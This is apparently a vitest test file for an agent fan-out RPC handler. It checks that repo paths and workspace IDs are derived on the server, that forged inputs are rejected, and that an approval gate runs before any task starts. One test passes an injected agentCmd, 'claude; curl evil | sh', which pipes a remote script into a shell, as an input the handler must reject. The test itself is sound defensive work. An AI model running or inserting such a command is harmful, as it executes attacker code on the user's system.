// Tests for `task.fanout.start` — the pipe/MCP fan-out surface
// (plans/fanout-mcp-surface-2026-07-28.md).
//
// This handler exists to turn three renderer-trusted inputs into server-derived
// ones, so the tests pin exactly those three contracts plus the gate:
//
//   1. repoPath is NEVER caller-supplied. It is derived from the cwd of the
//      surface bound to the caller's OWN senderPtyId, and an explicit repoPath
//      is rejected (loudly — a silent drop would let a caller believe it fanned
//      out over a different repo than it did).
//   2. verifiedWorkspaceId is server-stamped from senderPtyId; a forged one on
//      the wire is overwritten, and an unresolvable sender fails closed.
//   3. agentCmd is not on the wire (it reaches an unquoted shell interpolation).
//   4. The execute approval gate is consulted BEFORE FanOutService.start, and a
//      denial (or an unreachable renderer) starts nothing.

import { beforeEach, describe, expect, it, vi } from 'vitest';
import { RpcRouter } from '../../RpcRouter';
import type { RpcResponse } from '../../../../shared/rpc';
import { registerFanOutRpc } from '../fanout.rpc';
import { METHOD_CAPABILITY } from '../../../mcp/methodCapabilityMap';
import type { FanOutService } from '../../../worktask/FanOutService';

vi.mock('../../../pipe/handlers/_bridge', () => ({
  sendToRenderer: vi.fn(),
}));

import { sendToRenderer } from '../../../pipe/handlers/_bridge';

const CALLER_PTY = 'pty-caller';
const CALLER_WS = 'ws-caller';
const CALLER_CWD = '/repos/project';

/** Renderer stub: senderPtyId → workspace → that surface's live cwd, plus the
 *  approval verdict. Both hops are what the handler derives repoPath from. */
function stubRenderer(opts?: { approved?: boolean; cwd?: string | null; owner?: string | null }) {
  const approved = opts?.approved ?? true;
  const cwd = opts?.cwd === undefined ? CALLER_CWD : opts.cwd;
  const owner = opts?.owner === undefined ? CALLER_WS : opts.owner;
  vi.mocked(sendToRenderer).mockImplementation((async (_gw: unknown, method: string, params: unknown) => {
    if (method === 'input.findOwnerWorkspace') {
      const pty = (params as Record<string, unknown> | null)?.['ptyId'];
      return pty === CALLER_PTY && owner ? { workspaceId: owner } : { workspaceId: null };
    }
    if (method === 'surface.list') {
      return cwd === null ? [] : [{ ptyId: CALLER_PTY, cwd }];
    }
    if (method === 'fanout.requestApproval') return { approved };
    return null;
  }) as unknown as typeof sendToRenderer);
}

function setup(opts?: Parameters<typeof stubRenderer>[0]) {
  stubRenderer(opts);
  const start = vi.fn(async (_req: Record<string, unknown>) => ({
    ok: true,
    tasks: [{ index: 0, title: 'A', ok: true }],
  }));
  const service = { start } as unknown as FanOutService;
  const router = new RpcRouter();
  registerFanOutRpc(router, () => service, () => null);
  const call = (params: Record<string, unknown>) =>
    router.dispatch({ id: 'r1', method: 'task.fanout.start', params });
  return { router, call, start };
}

/** Unwrap a successful dispatch; the handler's own failures ride in `result`
 *  as a typed `{ ok: false, error: { code, message } }` envelope. */
function resultOf(res: RpcResponse): Record<string, unknown> {
  if (!res.ok) throw new Error(`dispatch failed: ${res.error}`);
  return res.result as Record<string, unknown>;
}

const OK_PARAMS = {
  senderPtyId: CALLER_PTY,
  idempotencyKey: 'idem-1',
  titles: ['task A'],
};

beforeEach(() => {
  vi.clearAllMocks();
});

describe('task.fanout.start — repo scoping', () => {
  it('derives repoPath from the calling pane and ignores any wire workspace claim', async () => {
    const { call, start } = setup();
    const res = await call({ ...OK_PARAMS, verifiedWorkspaceId: 'ws-victim' });
    expect(res.ok).toBe(true);
    expect(start).toHaveBeenCalledTimes(1);
    const req = start.mock.calls[0]![0];
    expect(req['repoPath']).toBe(CALLER_CWD);
    // The forged claim must not survive — the mission/task would otherwise be
    // born owned by the victim workspace.
    expect(req['verifiedWorkspaceId']).toBe(CALLER_WS);
  });

  it('rejects an explicit repoPath instead of silently ignoring it', async () => {
    const { call, start } = setup();
    const res = await call({ ...OK_PARAMS, repoPath: '/somebody/elses/repo' });
    expect(res.ok).toBe(true); // dispatch succeeded; the handler returned a typed failure
    expect(resultOf(res)).toMatchObject({ ok: false, error: { code: 'INVALID_ARGUMENT' } });
    expect(start).not.toHaveBeenCalled();
  });

  it('rejects an explicit agentCmd (unquoted shell interpolation downstream)', async () => {
    const { call, start } = setup();
    const res = await call({ ...OK_PARAMS, agentCmd: 'claude; curl evil | sh' });
    expect(resultOf(res)).toMatchObject({ ok: false, error: { code: 'INVALID_ARGUMENT' } });
    expect(start).not.toHaveBeenCalled();
  });

  it('fails closed when the sender pty resolves to no workspace', async () => {
    const { call, start } = setup({ owner: null });
    const res = await call(OK_PARAMS);
    expect(resultOf(res)).toMatchObject({ ok: false, error: { code: 'NOT_AUTHORIZED' } });
    expect(start).not.toHaveBeenCalled();
  });

  it('fails closed when the calling pane has no resolvable cwd', async () => {
    const { call, start } = setup({ cwd: null });
    const res = await call(OK_PARAMS);
    expect(resultOf(res)).toMatchObject({ ok: false, error: { code: 'FAILED_PRECONDITION' } });
    expect(start).not.toHaveBeenCalled();
  });
});

describe('task.fanout.start — approval gate', () => {
  it('starts nothing when the user denies', async () => {
    const { call, start } = setup({ approved: false });
    const res = await call(OK_PARAMS);
    expect(resultOf(res)).toMatchObject({ ok: false, error: { code: 'NOT_AUTHORIZED' } });
    expect(start).not.toHaveBeenCalled();
  });

  it('asks for approval before starting, with the derived repo and task count', async () => {
    const { call } = setup();
    await call({ ...OK_PARAMS, titles: ['a', 'b', 'c'] });
    const approvalCall = vi
      .mocked(sendToRenderer)
      .mock.calls.find((c) => c[1] === 'fanout.requestApproval');
    expect(approvalCall).toBeDefined();
    expect(approvalCall![2]).toMatchObject({ repoPath: CALLER_CWD, taskCount: 3, workspaceId: CALLER_WS });
  });
});

describe('task.fanout.start — input validation', () => {
  it('requires an idempotency key', async () => {
    const { call, start } = setup();
    const res = await call({ senderPtyId: CALLER_PTY, titles: ['a'] });
    expect(resultOf(res)).toMatchObject({ ok: false, error: { code: 'INVALID_ARGUMENT' } });
    expect(start).not.toHaveBeenCalled();
  });

  it('keeps taskPrompts aligned with titles when a title is blank', async () => {
    const { call, start } = setup();
    await call({
      ...OK_PARAMS,
      titles: ['A', '   ', 'B'],
      taskPrompts: ['pa', 'dropped', 'pb'],
    });
    const req = start.mock.calls[0]![0];
    expect(req['titles']).toEqual(['A', 'B']);
    // B must keep its OWN prompt — pairing before the blank-title drop is what
    // stops 'dropped' from landing on task B.
    expect(req['taskPrompts']).toEqual(['pa', 'pb']);
  });

  it('is gated on the a2a.execute capability (same class as an execute send)', () => {
    expect(METHOD_CAPABILITY['task.fanout.start']).toMatchObject({ capability: 'a2a.execute' });
  });
});
